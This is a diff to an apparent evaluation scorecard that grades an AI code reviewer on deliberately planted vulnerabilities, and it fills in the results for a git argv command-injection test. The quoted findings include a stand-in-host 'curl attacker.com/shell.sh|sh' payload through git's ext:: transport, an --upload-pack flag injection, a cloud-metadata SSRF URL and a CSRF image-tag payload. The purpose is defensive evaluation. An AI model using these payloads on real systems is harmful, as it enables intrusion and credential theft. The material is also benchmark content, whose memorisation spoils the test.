@@ -32,10 +32,19 @@ Columns:
 | 8 | SSRF | `vuln/ssrf` | — |  |  |  |  |  |  |
 | 9 | XSS | `vuln/xss` | — |  |  |  |  |  |  |
 | 10 | Log injection | `vuln/log-injection` | — |  |  |  |  |  |  |
-| 11 | Command injection — argv (depth probe) | `vuln/command-injection-argv` | — |  |  |  |  |  | Variant C — ProcessBuilder list with user-controlled arg; tests whether the review spots flag-injection without the obvious `Runtime.exec` smell |
+| 11 | Command injection — argv (depth probe) | `vuln/command-injection-argv` | [#4](https://github.com/DrivetrainAi/test-security/pull/4) | TP (3) | HIGH -> HIGH | Good | 0 | SSRF and auth-bypass as their own structured findings; CSRF-via-GET reasoning | Explicitly rebutted the "safe from injection" docblock; named both `ext::` transport and `--upload-pack=` flag injection; recommended `--` separator + scheme allowlist + `protocol.ext.allow=never` env hardening |
 | — | Negative controls | `safe/negative-controls` | — | n/a — should stay quiet |  | n/a |  | n/a |  |
 
-### Aggregate scores (fill in once all runs are complete)
+### Running tally (3 of 11 complete)
+
+- **True positives:** 3 / 3
+- **False negatives:** 0 / 3
+- **Severity accuracy (got == expected):** 3 / 3
+- **Fix quality == Good:** 3 / 3
+- **False positives on `safe/negative-controls`:** branch not yet built
+- **Bonus TPs caught:** missing-auth on all 3 endpoints (consistent contextual reasoning); SSRF + CSRF-via-GET on test #11
+
+### Aggregate scores (final, fill in once all 11 vuln runs are complete)
 
 - **True positives:** _ / 11
 - **False negatives:** _ / 11
@@ -160,7 +169,10 @@ Not yet implemented.
 
 ### 8. SSRF — `vuln/ssrf`
 
-Not yet implemented.
+Not yet implemented. Note: PR #4 surfaced an SSRF finding on the
+`vuln/command-injection-argv` branch as a bonus TP — the planned dedicated
+SSRF test should still be run separately so we can score on a clean,
+single-class branch.
 
 ### 9. XSS — `vuln/xss`
 
@@ -170,14 +182,68 @@ Not yet implemented.
 
 Not yet implemented.
 
-### 11. Command injection — argv (depth probe) — `vuln/command-injection-argv`
+### 11. Command injection — argv (depth probe) — `vuln/command-injection-argv` (PR [#4](https://github.com/DrivetrainAi/test-security/pull/4))
 
-Not yet implemented. Will plant a `ProcessBuilder` list pattern with a
-user-controlled argv element (e.g., a hostname or URL), where the target
-binary supports flag injection (e.g., `git clone <url>` -> `--upload-pack`,
-or `curl <url>` -> `-K <file>`). Comment in the source will explicitly
-claim the array form is "safe from injection" to test whether Claude
-challenges that assumption.
+**Expected** (see [`eval/expected/command-injection-argv.md`](./expected/command-injection-argv.md)):
+- `GitMirrorController.mirror` invokes `git clone <url> /tmp/mirror` via
+  `ProcessBuilder` argv list — user-controlled `url` is one argv element.
+  The docblock explicitly claims the array form makes this safe, which is
+  the bait this test exists to challenge.
+- Expected severity: **HIGH**.
+- Expected reasoning depth: review must explicitly rebut the "safe from
+  injection" claim AND name at least one specific flag-injection vector
+  (`--upload-pack=...` or `ssh://-oProxyCommand=...` family or `ext::`
+  transport) to count as a deep-pass; otherwise it's a partial pass.
+
+**Actual — three findings from the workflow's PR comment:**
+
+1. **RCE via git `ext::` transport + `--upload-pack` argument injection** —
+   HIGH — category `command_injection`. Directly rebuts the docblock:
+   *"The Javadoc's claim that 'the URL is just data to git' is incorrect —
+   git actively interprets URL schemes and option-like arguments."*
+   Exploit scenarios:
+   - `?url=ext::sh -c curl attacker.com/shell.sh|sh` invoking the `ext::`
+     transport handler. Cites git's `protocol.ext.allow=user` policy
+     (which permits `ext::` when on the command line).
+   - `?url=--upload-pack=id` injecting an option that overrides the
+     upload-pack program, executing arbitrary commands when `/tmp/mirror`
+     already exists from a prior clone.
+   Recommendations: scheme allowlist + reject leading `-`; `--` separator
+   before positional args (`new ProcessBuilder("git", "clone", "--", url, "/tmp/mirror")`);
+   environment hardening (`GIT_TERMINAL_PROMPT=0`, `-c protocol.ext.allow=never`).
+
+2. **SSRF via unconstrained URL** — HIGH — category `ssrf`. Exploit
+   scenarios: AWS instance metadata
+   (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`)
+   to steal IAM creds via git's combined stdout/stderr in the response
+   body; internal-port probing via differential error messages;
+   `file:///` scheme for local filesystem. Recommendations: HTTPS-only
+   scheme, host allowlist (github.com, gitlab.com), block RFC 1918 +
+   link-local + localhost.
+
+3. **Unauthenticated dangerous endpoint / authorization bypass** —
+   HIGH — category `authorization_bypass`. Notes there's no Spring
+   Security in the project; cites the TODO on line 20. Adds CSRF angle:
+   *"Since this is a GET endpoint, it can also be triggered via CSRF —
+   `<img src='https://target/ops/mirror?url=ext::malicious'>`"*.
+   Recommendations: `@PreAuthorize("hasRole('ADMIN')")`, switch to POST
+   for state-changing operations.
+
+**Score:**
+- Flagged: TP — depth-pass on the planted vuln + 2 separate structured
+  bonus findings.
+- Severity: HIGH == HIGH on the planted finding. Accurate.
+- Fix quality: **Good.** The `--` separator + scheme allowlist + env
+  hardening combination is the most thorough remediation we've seen in
+  the run so far. The CSRF-via-GET observation on the auth finding is
+  sophisticated and not telegraphed by the source code.
+- False positives: 0.
+- Bonus findings: SSRF (will overlap with the planned dedicated SSRF
+  branch) and authorization-bypass (consistent with the running pattern).
+
+**Links:**
+- PR: https://github.com/DrivetrainAi/test-security/pull/4
+- Review comment: see PR conversation
 
 ### Negative controls — `safe/negative-controls`
 
